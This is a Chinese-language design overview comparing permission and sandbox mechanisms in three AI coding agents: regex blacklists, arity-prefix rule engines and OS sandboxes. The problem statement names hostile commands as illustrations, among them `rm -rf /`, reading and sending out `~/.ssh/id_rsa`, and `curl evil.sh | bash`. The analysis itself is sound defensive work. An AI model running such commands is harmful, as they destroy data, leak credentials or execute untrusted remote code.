# 【总纲】Permissions & Sandbox：把"模型想干的事"关进笼子的三道门

> 源码取证基准：三家全部读源/抠二进制完成。
> - **Hermes**：`tools/approval.py`（1645 行，本机 editable 安装 `/Users/xiaogexu/.hermes/hermes-agent/`，0.15.1），辅以 `tools/tirith_security.py`、`tools/website_policy.py`、`tools/credential_files.py`。
> - **OpenCode**：`packages/opencode/src/permission/index.ts`（规则引擎）+ `permission/arity.ts`（命令 arity 字典）+ `packages/core/src/v1/config/permission.ts`（schema），commit `cd292a4`。
> - **Claude Code**：官方不开源，证据取自 v2.1.161 原生二进制（`bin/claude.exe`，`strings` 抠出嵌入常量）+ `sdk-tools.d.ts` 类型定义。GIT_SHA `6a550ae`，BUILD_TIME 2026-06-02。**第三方复刻不作为官方证据**。

## 这个 Category 解决什么问题

Agent 能 `rm -rf /`、能 `git push --force`、能把 `~/.ssh/id_rsa` 读出来发到外网、能 `curl evil.sh | bash`。模型是个**没有恶意但也没有后果意识**的执行体——你给它 shell，它就敢用。Permissions & Sandbox 这一层要回答三个递进的问题：

1. **要不要拦？**（识别）——这条命令/这次编辑/这次网络请求，危险吗？该放行、该问人、还是该直接拒？
2. **怎么问？**（审批）——拦下来之后，是弹窗等人拍板，还是自动判定，还是按预置规则静默放行？
3. **拦不住怎么办？**（兜底隔离）——万一识别漏了、审批被骗过了，有没有一层 OS 级的硬墙，让"即使模型跑了恶意命令也炸不出沙箱"？

三家对这三问的答法，恰好暴露了三种**根本不同的安全哲学**，也是本总纲下三篇父设计的分界。

## 三家安全哲学的根本分野（一句话先抛结论）

| | 识别危险 | 审批方式 | OS 级硬隔离 |
|---|---|---|---|
| **Hermes** | **硬编码模式黑名单**：12 条 HARDLINE 正则 + 47 条 DANGEROUS 正则 | 两级门：HARDLINE 直接拒，DANGEROUS 弹人工审批（可选 LLM 智能预判） | **无**。靠"识别 + 审批"软门，不开 OS 沙箱 |
| **OpenCode** | **不预判危险**，把判断权交给配置 | 配置驱动规则集：每个工具 `ask`/`allow`/`deny`，命令按 **arity 前缀** + 通配符 last-match-wins | **无**。同样纯软门，无 seatbelt/bwrap |
| **Claude Code** | 配置式 `permissions.allow/deny`（`Tool(specifier)` 语法）+ 权限模式 | 6 种 permission mode（default/acceptEdits/plan/bypassPermissions/dontAsk/auto） | **有**。macOS seatbelt（`sandbox-exec`）/ Linux bubblewrap+seccomp，文件读写 + 网络双层硬隔离 |

**最锋利的一刀**：只有 Claude Code 给了 OS 级硬墙。Hermes 和 OpenCode 都赌"软门拦得住"——它们的安全边界是**进程内的字符串匹配**，一旦模式没覆盖到（Hermes 漏了某条正则）或配置写松了（OpenCode 默认 `*: allow`），恶意命令就能直接落到真实文件系统上。Claude Code 多花了 bubblewrap/seatbelt 的工程成本，换来"即使前两道门都破了，第三道墙还在"。这是**纵深防御 vs 单层防御**的差异，不是实现细节差异。

## 本总纲下的三篇父设计（广度优先穷尽同级）

> 三篇分别解剖三家最有代表性的那道门，互为镜像对照。读完三篇能回答：给 agent 装安全门，业界目前有哪三种范式、各自的数据结构长什么样、处理流程在哪里会漏。

1. **父设计一 · Hermes：硬编码模式黑名单 + 两级审批门** —— 解决"识别"问题的最朴素答法：把人类已知的危险命令写成正则表的两个等级（不可逆的直接拒、有风险的问人）。数据结构是两张正则表 + 一个审批决策枚举；流程是"逐条匹配 → 命中等级 → 路由到拒绝/审批/放行"。优点是开箱即用、零配置即有保护；致命弱点是**黑名单永远漏**——没列进表的危险命令一律放行。

2. **父设计二 · OpenCode：配置驱动的 arity 前缀规则引擎** —— 解决"怎么问"的最优雅答法：不预判危险，而是把命令解析成**人类可理解的最短前缀**（`git checkout main` → `git checkout`），再用通配符规则表做 last-match-wins 匹配，逐工具配 `ask/allow/deny`。数据结构是 arity 字典 + 有序规则数组；流程是"解析命令树 → 提取 arity 前缀 → 规则匹配 → 三态裁决"。优点是用户完全可控、规则可复用（同前缀一次批准长期生效）；弱点是**默认配置的松紧全压在用户身上**。

3. **父设计三 · Claude Code：OS 级沙箱（seatbelt / bubblewrap）+ 权限模式** —— 解决"拦不住怎么办"的唯一答法：在软门之下再叠一层 OS 内核级隔离。数据结构是 seatbelt profile（`(allow file-read*)`/`(deny ...)` S-表达式）+ 文件读写/网络的 allow/deny 配置 + 6 种权限模式枚举；流程是"组装沙箱 profile → 在沙箱内执行 → 失败可选 `dangerouslyDisableSandbox` 降级"。优点是**纵深防御**，软门破了还有硬墙；弱点是平台依赖重（需装 bwrap/socat/seccomp）、有逃生舱口（`dangerouslyDisableSandbox`）。

## 提炼：给 agent 装安全门的三层认知

把三家拼起来，一个完整的 agent 权限系统其实是**三层纵深**，三家各自只点亮了其中一两层：

- **第一层 · 识别（谁危险）**：Hermes 用黑名单正则（已知危险），Claude Code 用配置 allow/deny（声明式），OpenCode 干脆不预判（交给规则）。黑名单的根本缺陷是**封闭世界假设**——它假设"危险命令是可枚举的"，但攻击面是开放的。
- **第二层 · 审批（怎么决定）**：从"全自动放行"到"全人工拍板"是一条光谱。Hermes 的 HARDLINE 是光谱最左（直接拒，不给商量），permission mode 的 `bypassPermissions` 是最右（全自动）。**好的设计是让这条光谱可配置且默认安全**——默认问人，用户主动放宽。
- **第三层 · 隔离（炸了能否兜住）**：这是前两层的保险。**只有这一层不依赖"识别得准"**——seatbelt 不关心命令是不是恶意，它只管"这个进程能不能写 `~/.ssh`"。这是从"信任模型不作恶"转向"假设模型会作恶"的范式跃迁。

**对用户手动做法的启发**：你给任何 agent（包括我）开 shell 权限时，脑子里要有这三层。如果用的工具只有第一、二层（Hermes / OpenCode 默认态），那"识别 + 审批"就是你唯一的防线——意味着**高危操作必须你亲自过眼**，不能图省事开全自动。如果工具有第三层（Claude Code 沙箱、或你自己用 Docker / 受限用户跑 agent），才有资格把审批放宽。**永远不要在没有第三层隔离的环境里，对一个能联网 + 能写文件的 agent 开 bypass/全自动模式**——那等于把 `~/.ssh`、`.env`、生产数据库凭证全押在"黑名单没漏"这一个赌注上。

## 关联

- 同 Category 三篇父设计（见上）。
- 跨 Category：与 **Tool Use**（工具调用本身的机制）正交——本 Category 管"调用前该不该放行"，Tool Use 管"放行后怎么调"。与 **Multi-Agent** 相关——subagent 的权限继承/隔离是本机制在多智能体场景的延伸。
